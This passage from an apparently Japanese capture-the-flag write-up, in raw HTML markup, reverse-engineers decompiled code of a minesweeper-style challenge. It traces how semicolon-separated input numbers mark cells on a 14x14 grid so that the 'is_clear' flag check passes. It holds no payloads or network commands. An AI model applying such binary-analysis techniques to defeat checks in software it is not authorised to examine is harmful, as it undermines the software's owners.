operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;change_value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
iVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; is_clear&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;関数は独自にリネーム済みです。&lt;/p&gt;
&lt;p&gt;最終的にFlagを取得できる&lt;code class=&quot;language-text&quot;&gt;is_clear&lt;/code&gt;関数を参照したところ、以下のようになっていました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 644px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9d704f9817b6811e57b88a49d2206d71/78274/image-20220314233543897.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 58.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABPklEQVQoz52T63KDIBCFff/H6fP0R2+5KooKIrBweqQxk6bNTJKdOaOu+HGWXSulgd7UGI4v0M0rRgPknLBEzhmPRpVSQkqRWlP5aVgBtnqAMV/w3p1Bqy6f7waKWMTo6VD+vLwEXW50vekvYKdHGLozIWCOUuAxOiqW4m+BbqnSvWBz9NBuhluAYSZsKsB7ozg9ma2sJcRbJJkgEuEDr3QYeN97j8EHTHQfo0EI7uTeIsRAxTNoBVfznHE4KBzqEfumxptu8TlodJPF7jjgfdtylDYYLdcMO9TKYruvMY4fzHfMG6hRYdNu4SaHKqeMphF0vecZUpKKoggdJSqwYR7CpoW0VLDkOGYyl4qE6/zyXfA/DoUvgHUI09Pzd+6yanq0WqHj3zK7oeyUrmbwoS7zbFkeS1zmMP8/g4/EN1alsc1t6g9kAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9d704f9817b6811e57b88a49d2206d71/8ac56/image-20220314233543897.webp 240w,
/static/9d704f9817b6811e57b88a49d2206d71/d3be9/image-20220314233543897.webp 480w,
/static/9d704f9817b6811e57b88a49d2206d71/f847d/image-20220314233543897.webp 644w&quot;
              sizes=&quot;(max-width: 644px) 100vw, 644px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9d704f9817b6811e57b88a49d2206d71/8ff5a/image-20220314233543897.png 240w,
/static/9d704f9817b6811e57b88a49d2206d71/e85cb/image-20220314233543897.png 480w,
/static/9d704f9817b6811e57b88a49d2206d71/78274/image-20220314233543897.png 644w&quot;
            sizes=&quot;(max-width: 644px) 100vw, 644px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9d704f9817b6811e57b88a49d2206d71/78274/image-20220314233543897.png&quot;
            alt=&quot;image-20220314233543897&quot;
            title=&quot;image-20220314233543897&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DAT_0010409c&lt;/code&gt;には0xeが格納されているので、上記のコードは&lt;code class=&quot;language-text&quot;&gt;DAT_555555558100&lt;/code&gt;の値を先頭から4バイトずつ196回(0xe * 0xe)チェックし、それらのすべての値が0x2dまたは0x2aの時のみFlagが取得できるという挙動のようです。&lt;/p&gt;
&lt;p&gt;しかし、ユーザの入力では&lt;code class=&quot;language-text&quot;&gt;DAT_555555558100&lt;/code&gt;の値を直接操作することはできません。&lt;/p&gt;
&lt;p&gt;main関数のをさかのぼると、ユーザの入力値によって&lt;code class=&quot;language-text&quot;&gt;DAT_555555558420&lt;/code&gt;の値が変化する以下のコードを見つけました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; token&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; token &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xac&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined8 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;acStack120 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x5555555559d2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    iVar3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_555555558420 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; iVar3&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined8 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;acStack120 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x5555555559fe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    token &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strtok&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のコードでは、入力された値を&lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;で区切り、最大で0xac個までチェックします。&lt;/p&gt;
&lt;p&gt;そして、&lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;で区切られた範囲内の数字を4倍したものを&lt;code class=&quot;language-text&quot;&gt;DAT_555555558420&lt;/code&gt;の領域の先頭から0xac個、順に格納しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xac&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    iVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_555555558420 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;change_value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;DAT_555555558420&lt;/code&gt;の領域に格納された値は、次に実行される以下のコードで間接的に&lt;code class=&quot;language-text&quot;&gt;DAT_555555558100&lt;/code&gt;の値を書き換えることができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xac&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  iVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_00104420 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;FUN_00101a29&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DAT_00104098 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
               &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DAT_0010409c &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
               &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;iVar1 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DAT_00104098 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のコードでは、&lt;code class=&quot;language-text&quot;&gt;DAT_00104420&lt;/code&gt;の領域を4バイトずつ0xac回探索し、その値を加工したものを&lt;code class=&quot;language-text&quot;&gt;FUN_00101a29&lt;/code&gt;に流し込んでいます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;FUN_00101a29&lt;/code&gt;の中では以下の通り、受け渡された値が指し示す&lt;code class=&quot;language-text&quot;&gt;DAT_555555558100&lt;/code&gt;のアドレスが0x2a以外の時のみ0x2dに書き換えられます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; div&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;div &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; mod&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mod &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_555555558100 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;div &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;mod&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;BOOM&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
